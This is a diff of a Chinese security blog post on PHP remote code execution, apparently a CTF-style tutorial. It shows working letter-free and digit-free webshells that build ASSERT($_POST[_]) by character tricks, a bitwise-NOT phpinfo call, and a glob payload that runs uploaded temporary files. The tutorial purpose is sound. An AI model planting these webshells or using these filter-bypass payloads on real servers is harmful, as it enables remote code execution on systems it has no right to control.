+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p>
 </blockquote>
-<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802lcnxij20i2027jrj.jpg" srcset="/img/loading.gif" lazyload alt="14872693882387.jpg"></p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802lcnxij20i2027jrj.jpg"
+                      alt="14872693882387.jpg"
+                ></p>
 <p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
 <h4 id="获取字母a"><a href="#获取字母a" class="headerlink" title="获取字母a"></a>获取字母a</h4><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>,再取这个字符串的第一个字母，就可以获得’A’了。</p>
 <p>利用这个技巧，编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure></div>
 
 <h2 id="无数字字母shell提高篇"><a href="#无数字字母shell提高篇" class="headerlink" title="无数字字母shell提高篇"></a>无数字字母shell提高篇</h2><p>多了两个限制：</p>
 <ol>
@@ -443,7 +686,7 @@
 </ol>
 <h3 id="PHP7下"><a href="#PHP7下" class="headerlink" title="PHP7下"></a>PHP7下</h3><p>执行动态函数<code>($a)();</code> (PHP7后支持)</p>
 <p>e.g. <code>(&#39;phpinfo&#39;)();</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)(); <span class="hljs-comment">//phpinfo()</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)(); <span class="comment">//phpinfo()</span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="PHP5下"><a href="#PHP5下" class="headerlink" title="PHP5下"></a>PHP5下</h3><p>Linux shell知识点：</p>
 <ol>
@@ -463,400 +706,453 @@
 </blockquote>
 <p>但这种匹配的结果过多，假设要执行<code>/tmp/phpcjggLC</code></p>
 <p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”,那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">?[</span>^-]<span class="hljs-string">??</span><span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/???[^-]?????</span><br></pre></td></tr></table></figure></div>
 
 <p>跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329195.jpg" srcset="/img/loading.gif" lazyload alt="image-20220816023000185"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329195.jpg"
+                      alt="image-20220816023000185"
+                ></p>
 <p>所有匹配到的文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
 <p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间,我们可以利用<code>[@-[]</code>来表示大写字母</p>
 <p>最终payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`. /???/????????[@-[]`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`. /???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<h2 id="无数字字母shell的一些trick"><a href="#无数字字母shell的一些trick" class="headerlink" title="无数字字母shell的一些trick"></a>无数字字母shell的一些trick</h2><h3 id="获取数字1-0"><a href="#获取数字1-0" class="headerlink" title="获取数字1 0"></a>获取数字1 0</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//bool(true)</span><br><span class="hljs-title function_ invoke__">var_dump</span>(!!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//bool(false)</span><br><span class="hljs-title function_ invoke__">var_dump</span>(!<span class="hljs-string">&#x27;&#x27;</span>+!!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//int(1)</span><br><span class="hljs-comment">//直接放下标也行</span><br><span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>[!<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//赋值$_[1]</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>[!!<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//赋值$_[0]</span><br></code></pre></td></tr></table></figure>
+<h2 id="无数字字母shell的一些trick"><a href="#无数字字母shell的一些trick" class="headerlink" title="无数字字母shell的一些trick"></a>无数字字母shell的一些trick</h2><h3 id="获取数字1-0"><a href="#获取数字1-0" class="headerlink" title="获取数字1 0"></a>获取数字1 0</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(!<span class="string">&#x27;&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!!<span class="string">&#x27;&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!<span class="string">&#x27;&#x27;</span>+!!<span class="string">&#x27;&#x27;</span>);<span class="comment">//int(1)</span></span><br><span class="line"><span class="comment">//直接放下标也行</span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$_</span>[!<span class="string">&#x27;&#x27;</span>];<span class="comment">//赋值$_[1]</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[!!<span class="string">&#x27;&#x27;</span>];<span class="comment">//赋值$_[0]</span></span><br></pre></td></tr></table></figure></div>
 
 
 
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> RCE总结</li>
+        <li><strong>作者:</strong> Sl0th</li>
+        <li><strong>创建于
+                :</strong> 2022-07-03 23:29:09</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-07-03 23:30:38
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://sl0th.top/2022/07/03/RCE总结/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/php/">#php</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/rce/">#rce</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Mysql提权</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2022/07/02/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">类加载机制</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">RCE总结</div>
